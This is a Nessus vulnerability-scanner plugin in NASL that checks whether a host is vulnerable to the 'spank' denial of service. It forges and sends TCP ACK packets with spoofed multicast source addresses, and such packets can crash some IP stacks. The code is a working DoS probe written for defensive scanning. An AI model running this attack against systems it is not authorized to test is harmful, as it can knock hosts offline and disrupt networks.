#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");

if(description)
{
 script_id(11901);
 script_version ("$Revision: 1.15 $");
 
 script_name(english:"TCP/IP Multicast Address Handling Remote DoS (spank.c)");
 
 script_set_attribute(attribute:"synopsis", value:
"This system answers to TCP packets that are coming from 
a multicast address." );
 script_set_attribute(attribute:"description", value:
"This is known as the 'spank' denial of service attack.
An attacker might use this flaw to shut down this server and
saturate your network, thus preventing you from working properly.

This also could be used to run stealth portscans against this machine." );
 script_set_attribute(attribute:"solution", value:
"Contact your operating system vendor for a patch.
Filter out multicast addresses (224.0.0.0/4)" );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:A/AC:L/Au:N/C:N/I:N/A:C" );

script_end_attributes();

 
 script_summary(english:"Sends a TCP packet from a multicast address");
 script_category(ACT_KILL_HOST);	# Some IP stacks are crashed by this attack
 script_copyright(english:"This script is Copyright (C) 2003-2009 Tenable Network Security, Inc.");
 script_family(english:"Denial of Service");
# Do not be paranoid -- see code
 exit(0);
}

#
include("global_settings.inc");

# We could use a better pcap filter to avoid a false positive... 
if (islocalhost()) exit(0);
if ( TARGET_IS_IPV6 ) exit(0);

dest = get_host_ip();

a = 224 +  rand() % 16;
b = rand() % 256;
c = rand() % 256;
d = rand() % 256;
src = strcat(a, ".", b, ".", c, ".", d);

if (! defined_func("join_multicast_group"))
  m = 0;
else
  m = join_multicast_group(src);
if (! m && ! islocalnet()) exit(0);
# Either we need to upgrade libnasl, or multicast is not 
# supported on this host / network
# If we are on the same network, the script may work, otherwise, the chances
# are very small -- only if we are on the way to the default multicast
# gateway

start_denial();

id = rand() % 65536;
seq = rand();
ack = rand();

#sport = rand() % 65535 + 1; dport = rand() % 65535 + 1;
sport = rand() % 64512 + 1024;
dport = get_host_open_port();
if (! dport) dport = rand() % 65535 + 1;
			
ip = forge_ip_packet(ip_v: 4, ip_hl : 5, ip_tos : 0x08, ip_len : 20,
		     ip_id : id, ip_p : IPPROTO_TCP, ip_ttl : 255,
		     ip_off : 0, ip_src : src);

tcpip = forge_tcp_packet(ip: ip, th_sport: sport, th_dport: dport,   
			 th_flags: TH_ACK, th_seq: seq, th_ack: 0,
			 th_x2: 0, th_off: 5,  th_win: 2048, th_urp: 0);

pf = strcat("tcp and src host ", dest, " and dst host ", src);
ok = 0;
for (i = 0; i < 3 && ! ok; i ++)
{
  r = send_packet(tcpip, pcap_active:TRUE, pcap_filter: pf);
  if (r) ok = 1;
}

alive = end_denial();
if (! alive && report_paranoia >= 2)
{
 security_warning(0);
 set_kb_item(name:"Host/dead", value:TRUE);
}
else if (ok)
 security_warning(port: 0, extra: 
'Although the machine did not crash, 
it answered by sending back a multicast TCP packet.');
